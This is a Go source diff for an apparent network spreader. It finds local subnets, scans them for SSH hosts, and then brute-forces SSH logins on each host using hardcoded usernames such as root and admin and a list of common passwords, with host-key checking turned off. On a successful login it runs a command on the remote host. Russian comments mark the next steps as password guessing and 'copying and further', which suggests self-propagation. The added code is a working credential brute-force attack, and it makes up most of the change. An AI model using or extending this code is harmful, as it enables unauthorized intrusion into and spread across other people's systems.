@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"fmt"
 	"io"
 	"log"
@@ -9,24 +10,59 @@ import (
 	"strconv"
 	"strings"
 	"time"
+
+	"golang.org/x/crypto/ssh"
+)
+
+var (
+	username  = []string{"test", "root", "admin", "user"}
+	passwords = []string{"123456", "egg", "password", "12345678", "qwerty", "11111111", "123456789", "12345", "1234", "111111", "1234567", "123123", "abc123", "12345678", "88888888", "qwerty1234", "qwerty12345678"}
 )
 
 func main() {
 	// какая подсеть
 	netIP := myNet()
 	for _, ip := range netIP {
-		log.Println("найдена подсеть ", ip)
+		log.Println("network ", ip)
 	}
 
 	// поиск хостов
 	allHost := searchHosts(netIP)
 	for _, ssh := range allHost {
-		log.Println("доступны по ssh ", ssh)
+		log.Println("host ", ssh)
 	}
 
 	// подбор пароля
+	for _, sshHost := range allHost {
 
-	// копирование и ДАЛЬШЕ
+		for _, us := range username {
+
+			for _, pas := range passwords {
+
+				config := &ssh.ClientConfig{
+					User: us,
+					Auth: []ssh.AuthMethod{
+						ssh.Password(pas),
+					},
+					Timeout:         10 * time.Second,
+					HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+				}
+
+				client, err := ssh.Dial("tcp", sshHost+":22", config)
+
+				if err != nil {
+					continue
+				}
+
+				log.Println("login: ", us, "password: ", pas, " OK")
+
+				// копирование и ДАЛЬШЕ
+				doIt(client)
+
+				break
+			}
+		}
+	}
 }
 
 // поиск подсетей
@@ -88,4 +124,22 @@ func searchHosts(netIP []string) []string {
 		}
 	}
 	return allHosts
+}
+
+func doIt(client *ssh.Client) {
+	session, err := client.NewSession()
+	if err != nil {
+		panic("Failed to create session: " + err.Error())
+	}
+	defer session.Close()
+
+	var b bytes.Buffer
+	session.Stdout = &b
+	if err := session.Run("/usr/bin/whoami"); err != nil {
+		panic("Failed to run: " + err.Error())
+	}
+
+	fmt.Println(b.String())
+
+	os.Exit(0)
 }
